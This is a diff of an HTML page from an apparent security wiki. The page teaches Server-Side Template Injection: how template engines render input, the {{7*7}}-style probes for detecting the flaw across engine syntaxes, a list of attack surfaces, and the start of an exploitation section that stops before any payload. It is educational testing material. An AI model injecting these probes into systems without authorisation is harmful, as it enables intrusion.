@@ -1,39 +1,57 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Server-Side Template Injection (SSTI) # Introduction # Server-Side Template Injection (SSTI) is a web vulnerability that happens when an attacker can inject malicious input into a server-side template, and that input gets executed by the template engine instead of being treated as plain text.
-Suppose a developer uses Jinja template engine and created a code block as &lt;h1&gt; Hello {{ username }}&lt;/h1&gt; If the user input section (username) is not sanitized then it can execute different system level commands.">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Server-Side Template Injection (SSTI)" />
-<meta property="og:description" content="Server-Side Template Injection (SSTI) # Introduction # Server-Side Template Injection (SSTI) is a web vulnerability that happens when an attacker can inject malicious input into a server-side template, and that input gets executed by the template engine instead of being treated as plain text.
-Suppose a developer uses Jinja template engine and created a code block as &lt;h1&gt; Hello {{ username }}&lt;/h1&gt; If the user input section (username) is not sanitized then it can execute different system level commands." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-13T23:21:07+05:30" />
-<title>Server-Side Template Injection (SSTI) | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Server-Side Template Injection (SSTI)# Introduction# Server-Side Template Injection (SSTI) is a web vulnerability that happens when an attacker can inject malicious input into a server-side template, and that input gets executed by the template engine instead of being treated as plain text.
+Suppose a developer uses Jinja template engine and created a code block as &lt;h1&gt; Hello {{ username }}&lt;/h1&gt; If the user input section (username) is not sanitized then it can execute different system level commands. One can confirm it using a mathematical expression 7*7 If the output comes as 49 then the username section may be vulnerable to SSTI Fundamentals of Server-Side Template Injection (SSTI)# What is a Template Engine?
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="Server-Side Template Injection (SSTI)">
+	<meta property="og:description" content="Server-Side Template Injection (SSTI)# Introduction# Server-Side Template Injection (SSTI) is a web vulnerability that happens when an attacker can inject malicious input into a server-side template, and that input gets executed by the template engine instead of being treated as plain text.
+Suppose a developer uses Jinja template engine and created a code block as &lt;h1&gt; Hello {{ username }}&lt;/h1&gt; If the user input section (username) is not sanitized then it can execute different system level commands. One can confirm it using a mathematical expression 7*7 If the output comes as 49 then the username section may be vulnerable to SSTI Fundamentals of Server-Side Template Injection (SSTI)# What is a Template Engine?">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-13T23:21:07+05:30">
+
+
+	<meta itemprop="name" content="Server-Side Template Injection (SSTI)">
+	<meta itemprop="description" content="Server-Side Template Injection (SSTI)# Introduction# Server-Side Template Injection (SSTI) is a web vulnerability that happens when an attacker can inject malicious input into a server-side template, and that input gets executed by the template engine instead of being treated as plain text.
+Suppose a developer uses Jinja template engine and created a code block as &lt;h1&gt; Hello {{ username }}&lt;/h1&gt; If the user input section (username) is not sanitized then it can execute different system level commands. One can confirm it using a mathematical expression 7*7 If the output comes as 49 then the username section may be vulnerable to SSTI Fundamentals of Server-Side Template Injection (SSTI)# What is a Template Engine?">
+	<meta itemprop="dateModified" content="2026-08-13T23:21:07+05:30">
+	<meta itemprop="wordCount" content="1843">
+
+<title>Server-Side Template Injection (SSTI) • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -41,11 +59,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -56,9 +78,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -73,8 +92,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -90,8 +109,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -177,8 +196,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -225,8 +244,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -980,8 +999,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1002,8 +1021,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1024,8 +1043,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1046,8 +1065,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1068,8 +1087,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1103,8 +1122,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1125,8 +1144,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1147,8 +1166,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1169,35 +1188,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1205,30 +1202,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Server-Side Template Injection (SSTI)</strong>
+  <h3>Server-Side Template Injection (SSTI)</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1331,44 +1329,27 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="server-side-template-injection-ssti">
-  Server-Side Template Injection (SSTI)
-  <a class="anchor" href="#server-side-template-injection-ssti">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="server-side-template-injection-ssti">Server-Side Template Injection (SSTI)<a class="anchor" href="#server-side-template-injection-ssti">#</a></h1>
 <hr>
-<h2 id="introduction">
-  Introduction
-  <a class="anchor" href="#introduction">#</a>
-</h2>
+<h2 id="introduction">Introduction<a class="anchor" href="#introduction">#</a></h2>
 <p>Server-Side Template Injection (SSTI) is a web vulnerability that happens when an attacker can inject malicious input into a server-side template, and that input gets executed by the template engine instead of being treated as plain text.</p>
 <ul>
 <li>Suppose a developer uses Jinja template engine and created a code block as</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">h1</span>&gt; <span style="color:#a6e22e">Hello</span> {{ <span style="color:#a6e22e">username</span> }}&lt;/<span style="color:#f92672">h1</span>&gt;
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">h1</span>&gt; <span style="color:#a6e22e">Hello</span> {{ <span style="color:#a6e22e">username</span> }}&lt;/<span style="color:#f92672">h1</span>&gt;</span></span></code></pre></div><ul>
 <li>If the user input section (username) is not sanitized then it can execute different system level commands. One can confirm it using a mathematical expression</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span></span></span></code></pre></div><ul>
 <li>If the output comes as 49 then the username section may be vulnerable to SSTI</li>
 </ul>
-<h2 id="fundamentals-of-server-side-template-injection-ssti">
-  Fundamentals of Server-Side Template Injection (SSTI)
-  <a class="anchor" href="#fundamentals-of-server-side-template-injection-ssti">#</a>
-</h2>
+<h2 id="fundamentals-of-server-side-template-injection-ssti">Fundamentals of Server-Side Template Injection (SSTI)<a class="anchor" href="#fundamentals-of-server-side-template-injection-ssti">#</a></h2>
 <p><strong>What is a Template Engine?</strong></p>
 <p>A template engine is a software component that generates dynamic content by combining static templates with user-provided or application data. Instead of hardcoding HTML pages, developers use templates containing placeholders that are replaced with actual values during server-side rendering.</p>
 <p>For example, consider the following template:</p>
-<pre tabindex="0"><code>&lt;h1&gt;Hello {{ username }}&lt;/h1&gt;
-</code></pre><p>If the application receives the following data:</p>
-<pre tabindex="0"><code>username = Alice
-</code></pre><p>The rendered output becomes:</p>
-<pre tabindex="0"><code>&lt;h1&gt;Hello Alice&lt;/h1&gt;
-</code></pre><hr>
-<h2 id="how-template-engines-work">
-  How Template Engines Work
-  <a class="anchor" href="#how-template-engines-work">#</a>
-</h2>
+<pre tabindex="0"><code>&lt;h1&gt;Hello {{ username }}&lt;/h1&gt;</code></pre><p>If the application receives the following data:</p>
+<pre tabindex="0"><code>username = Alice</code></pre><p>The rendered output becomes:</p>
+<pre tabindex="0"><code>&lt;h1&gt;Hello Alice&lt;/h1&gt;</code></pre><hr>
+<h2 id="how-template-engines-work">How Template Engines Work<a class="anchor" href="#how-template-engines-work">#</a></h2>
 <p>The typical rendering process is:</p>
 <pre tabindex="0"><code>	User Input
       │
@@ -1382,93 +1363,76 @@ Template Engine
  Rendered HTML
       │
       ▼
-	 Browser
-</code></pre><p>The template engine interprets special syntax (such as <code>{{ }}</code>, <code>${ }</code>, <code>&lt;%= %&gt;</code>, etc.) and replaces placeholders with the supplied data before sending the final response to the client.</p>
+	 Browser</code></pre><p>The template engine interprets special syntax (such as <code>{{ }}</code>, <code>${ }</code>, <code>&lt;%= %&gt;</code>, etc.) and replaces placeholders with the supplied data before sending the final response to the client.</p>
 <hr>
-<h2 id="why-ssti-occurs">
-  Why SSTI Occurs
-  <a class="anchor" href="#why-ssti-occurs">#</a>
-</h2>
+<h2 id="why-ssti-occurs">Why SSTI Occurs<a class="anchor" href="#why-ssti-occurs">#</a></h2>
 <p>Server-Side Template Injection occurs when <strong>user-controlled input is interpreted as template code instead of being treated as plain text</strong>.</p>
 <p>Instead of inserting user input as data:</p>
-<pre tabindex="0"><code>Hello Alice
-</code></pre><p>the application may evaluate it as a template expression.</p>
+<pre tabindex="0"><code>Hello Alice</code></pre><p>the application may evaluate it as a template expression.</p>
 <p>For example, if an attacker supplies:</p>
-<pre tabindex="0"><code>{{7*7}}
-</code></pre><p>the template engine evaluates the expression and returns:</p>
-<pre tabindex="0"><code>49
-</code></pre><p>instead of displaying the literal string:</p>
-<pre tabindex="0"><code>{{7*7}}
-</code></pre><p>This confirms that user input is being executed by the template engine.</p>
+<pre tabindex="0"><code>{{7*7}}</code></pre><p>the template engine evaluates the expression and returns:</p>
+<pre tabindex="0"><code>49</code></pre><p>instead of displaying the literal string:</p>
+<pre tabindex="0"><code>{{7*7}}</code></pre><p>This confirms that user input is being executed by the template engine.</p>
 <hr>
-<h2 id="server-side-rendering-vs-client-side-rendering">
-  Server-Side Rendering vs Client-Side Rendering
-  <a class="anchor" href="#server-side-rendering-vs-client-side-rendering">#</a>
-</h2>
+<h2 id="server-side-rendering-vs-client-side-rendering">Server-Side Rendering vs Client-Side Rendering<a class="anchor" href="#server-side-rendering-vs-client-side-rendering">#</a></h2>
 <table>
-<thead>
-<tr>
-<th>Server-Side Rendering (SSR)</th>
-<th>Client-Side Rendering (CSR)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Templates are rendered on the server.</td>
-<td>Templates are rendered in the browser.</td>
-</tr>
-<tr>
-<td>Vulnerable to SSTI if user input is evaluated.</td>
-<td>Not vulnerable to SSTI (though client-side template injection may occur).</td>
-</tr>
-<tr>
-<td>Examples: Jinja2, Twig, Freemarker, Velocity</td>
-<td>Examples: React, Angular, Vue</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Server-Side Rendering (SSR)</th>
+					<th>Client-Side Rendering (CSR)</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Templates are rendered on the server.</td>
+					<td>Templates are rendered in the browser.</td>
+			</tr>
+			<tr>
+					<td>Vulnerable to SSTI if user input is evaluated.</td>
+					<td>Not vulnerable to SSTI (though client-side template injection may occur).</td>
+			</tr>
+			<tr>
+					<td>Examples: Jinja2, Twig, Freemarker, Velocity</td>
+					<td>Examples: React, Angular, Vue</td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="common-template-syntax">
-  Common Template Syntax
-  <a class="anchor" href="#common-template-syntax">#</a>
-</h2>
+<h2 id="common-template-syntax">Common Template Syntax<a class="anchor" href="#common-template-syntax">#</a></h2>
 <p>Different template engines use different delimiters for expressions.</p>
 <table>
-<thead>
-<tr>
-<th>Syntax</th>
-<th>Example</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>{{ }}</code></td>
-<td><code>{{7*7}}</code></td>
-</tr>
-<tr>
-<td><code>${ }</code></td>
-<td><code>${7*7}</code></td>
-</tr>
-<tr>
-<td><code>&lt;%= %&gt;</code></td>
-<td><code>&lt;%= 7*7 %&gt;</code></td>
-</tr>
-<tr>
-<td><code>#{ }</code></td>
-<td><code>#{7*7}</code></td>
-</tr>
-<tr>
-<td><code>{% %}</code></td>
-<td><code>{% if user %}</code> (logic statements)</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Syntax</th>
+					<th>Example</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>{{ }}</code></td>
+					<td><code>{{7*7}}</code></td>
+			</tr>
+			<tr>
+					<td><code>${ }</code></td>
+					<td><code>${7*7}</code></td>
+			</tr>
+			<tr>
+					<td><code>&lt;%= %&gt;</code></td>
+					<td><code>&lt;%= 7*7 %&gt;</code></td>
+			</tr>
+			<tr>
+					<td><code>#{ }</code></td>
+					<td><code>#{7*7}</code></td>
+			</tr>
+			<tr>
+					<td><code>{% %}</code></td>
+					<td><code>{% if user %}</code> (logic statements)</td>
+			</tr>
+	</tbody>
 </table>
 <p>Understanding the syntax helps identify the underlying template engine during testing.</p>
 <hr>
-<h2 id="template-execution-flow">
-  Template Execution Flow
-  <a class="anchor" href="#template-execution-flow">#</a>
-</h2>
+<h2 id="template-execution-flow">Template Execution Flow<a class="anchor" href="#template-execution-flow">#</a></h2>
 <pre tabindex="0"><code>  Attacker Input
        │
        ▼
@@ -1491,15 +1455,8 @@ Template Engine
       Access Objects / Files / OS
                │
                ▼
-        Sensitive Data or RCE
-</code></pre><h2 id="attack-surfaces">
-  Attack Surfaces
-  <a class="anchor" href="#attack-surfaces">#</a>
-</h2>
-<h3 id="user-controlled-content-rendered-in-http-response">
-  User controlled content rendered in HTTP response
-  <a class="anchor" href="#user-controlled-content-rendered-in-http-response">#</a>
-</h3>
+        Sensitive Data or RCE</code></pre><h2 id="attack-surfaces">Attack Surfaces<a class="anchor" href="#attack-surfaces">#</a></h2>
+<h3 id="user-controlled-content-rendered-in-http-response">User controlled content rendered in HTTP response<a class="anchor" href="#user-controlled-content-rendered-in-http-response">#</a></h3>
 <ul>
 <li>Profile name</li>
 <li>Bio / About Me</li>
@@ -1512,10 +1469,7 @@ Template Engine
 <li>Ticket titles / descriptions</li>
 <li>Chat messages</li>
 </ul>
-<h3 id="email-templates">
-  Email Templates
-  <a class="anchor" href="#email-templates">#</a>
-</h3>
+<h3 id="email-templates">Email Templates<a class="anchor" href="#email-templates">#</a></h3>
 <p>Many apps dynamically generate emails using templates:</p>
 <ul>
 <li>Welcome emails</li>
@@ -1525,10 +1479,7 @@ Template Engine
 <li>Order confirmation</li>
 <li>Support responses</li>
 </ul>
-<h3 id="pdf--invoice-generators">
-  PDF / Invoice Generators
-  <a class="anchor" href="#pdf--invoice-generators">#</a>
-</h3>
+<h3 id="pdf--invoice-generators">PDF / Invoice Generators<a class="anchor" href="#pdf--invoice-generators">#</a></h3>
 <p>Apps frequently generate</p>
 <ul>
 <li>Reports</li>
@@ -1544,10 +1495,7 @@ Template Engine
 <li>Notes</li>
 <li>Organization</li>
 </ul>
-<h3 id="admin-dashboards">
-  Admin Dashboards
-  <a class="anchor" href="#admin-dashboards">#</a>
-</h3>
+<h3 id="admin-dashboards">Admin Dashboards<a class="anchor" href="#admin-dashboards">#</a></h3>
 <p>Admins dashboards can be customized with</p>
 <ul>
 <li>Table column names</li>
@@ -1563,20 +1511,14 @@ Template Engine
 <li>Role-based configs</li>
 <li>User preferences</li>
 </ul>
-<h3 id="search--filter-functionalities">
-  Search / Filter Functionalities
-  <a class="anchor" href="#search--filter-functionalities">#</a>
-</h3>
+<h3 id="search--filter-functionalities">Search / Filter Functionalities<a class="anchor" href="#search--filter-functionalities">#</a></h3>
 <ul>
 <li>Search query</li>
 <li>Sorting key</li>
 <li>Filter name</li>
 <li>Category label</li>
 </ul>
-<h3 id="file-names--metadata">
-  File names / Metadata
-  <a class="anchor" href="#file-names--metadata">#</a>
-</h3>
+<h3 id="file-names--metadata">File names / Metadata<a class="anchor" href="#file-names--metadata">#</a></h3>
 <ul>
 <li>Upload success message</li>
 <li>Gallery listing</li>
@@ -1584,19 +1526,13 @@ Template Engine
 <li>Logs</li>
 <li>Exported reports</li>
 </ul>
-<h3 id="logs--debug-pages">
-  Logs / Debug Pages
-  <a class="anchor" href="#logs--debug-pages">#</a>
-</h3>
+<h3 id="logs--debug-pages">Logs / Debug Pages<a class="anchor" href="#logs--debug-pages">#</a></h3>
 <ul>
 <li>Error Messages</li>
 <li>Debug Messages</li>
 <li>Activity History</li>
 </ul>
-<h3 id="http-headers">
-  HTTP Headers
-  <a class="anchor" href="#http-headers">#</a>
-</h3>
+<h3 id="http-headers">HTTP Headers<a class="anchor" href="#http-headers">#</a></h3>
 <ul>
 <li>User-Agent</li>
 <li>Referer</li>
@@ -1605,14 +1541,8 @@ Template Engine
 <li>Host</li>
 <li>Origin</li>
 </ul>
-<h2 id="exploiting-ssti">
-  Exploiting SSTI
-  <a class="anchor" href="#exploiting-ssti">#</a>
-</h2>
-<h3 id="the-template-engine">
-  The template engine
-  <a class="anchor" href="#the-template-engine">#</a>
-</h3>
+<h2 id="exploiting-ssti">Exploiting SSTI<a class="anchor" href="#exploiting-ssti">#</a></h2>
+<h3 id="the-template-engine">The template engine<a class="anchor" href="#the-template-engine">#</a></h3>
 <ul>
 <li>After finding out the template engine one can follow the official documents of the template engine.</li>
 <li>Learn about the points mentioned
@@ -1626,32 +1556,24 @@ Template Engine
 </ul>
 </li>
 </ul>
-<h3 id="understanding-the-context">
-  Understanding the context
-  <a class="anchor" href="#understanding-the-context">#</a>
-</h3>
+<h3 id="understanding-the-context">Understanding the context<a class="anchor" href="#understanding-the-context">#</a></h3>
 <ul>
 <li>
 <p>One need to understand the way application including the user input into the template</p>
 <ul>
 <li>The backend code is as in Jinja</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>....
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>....
 </span></span><span style="display:flex;"><span>....
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">current_user</span>
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">h1</span>&gt; <span style="color:#a6e22e">hello</span> {{ <span style="color:#a6e22e">user</span> }} &lt;/<span style="color:#f92672">h1</span>&gt;
 </span></span><span style="display:flex;"><span>...
-</span></span><span style="display:flex;"><span>...
-</span></span></code></pre></div><ul>
+</span></span><span style="display:flex;"><span>...</span></span></code></pre></div><ul>
 <li>One have to craft a payload as</li>
 </ul>
